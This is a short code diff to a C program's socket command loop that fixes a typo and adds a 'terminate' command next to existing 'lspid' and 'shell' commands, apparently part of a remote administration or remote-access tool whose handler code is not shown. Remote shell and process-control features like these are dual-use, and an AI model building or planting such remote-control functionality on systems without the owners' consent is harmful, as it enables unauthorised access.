@@ -99,14 +99,18 @@ int main(void){
 		cmd[strcspn(cmd, "\n")] = '\0';
 
 		if ( strcmp(cmd,"lspid") == 0){
-			printf("going to Hande func\n");
+			printf("going to Handle func\n");
 			HandleLspid(cmd,client_socket);
 			continue;
 		}
 		else if ( strcmp(cmd,"shell") == 0){
-			printf("going to Hande func\n");
+			printf("going to Handle func\n");
 			HandleShell(cmd,client_socket);
-			//cmd[0] = '\0';
+			continue;
+		}
+		else if ( strncmp(cmd,"terminate",9) == 0){
+			printf("going to Handle func\n");
+			HandleStopProcess(cmd,client_socket);
 			continue;
 		}
 
